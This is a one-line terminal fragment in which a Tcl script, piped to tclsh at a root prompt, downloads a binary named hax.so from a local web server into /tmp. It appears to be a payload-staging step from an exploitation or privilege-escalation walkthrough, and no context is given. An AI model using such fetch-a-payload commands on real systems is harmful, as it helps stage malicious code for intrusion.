# cat fetch.tcl  |tclsh
package require http ; set URL http://127.0.0.1:8080/hax.so; set f [open /tmp/hax.so.tcl wb]; set tok [http::geturl $URL -channel $f -binary 1]; close $f; if {[http::status $tok] eq "ok" && [http::ncode $tok] == 200} { puts "Downloaded successfully" }; http::cleanup $tok
